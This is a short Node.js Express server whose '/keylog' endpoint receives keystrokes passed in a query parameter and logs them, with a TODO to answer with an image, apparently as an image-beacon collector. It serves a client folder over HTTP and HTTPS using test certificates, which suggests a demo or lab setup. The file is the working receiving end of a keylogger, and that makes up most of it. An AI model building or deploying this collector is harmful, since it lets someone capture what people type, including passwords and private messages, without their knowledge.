var express = require('express');
var https = require('https');
var http = require('http');
var fs = require('fs');





// Create a service (the app object is just a callback).
var app = express();

app.use(express.static('../client'));
app.get('/keylog', logKeys);

function logKeys(req, res) {
	var k = req.query.k;
	console.log('keys', k);
	// TODO: send real image
	res.send('');
}





// Create an HTTP service.
http.createServer(app).listen(80);

try {
	var sslOptions = {
		key: fs.readFileSync('ssl/test_privatekey.pem'),
		cert: fs.readFileSync('ssl/test_cert.pem')
	};

	// Create an HTTPS service identical to the HTTP service.
	https.createServer(sslOptions, app).listen(443);
}
catch(e) {
	console.log('SSL key + cert not found, using only HTTP.')
	console.dir(e);
}
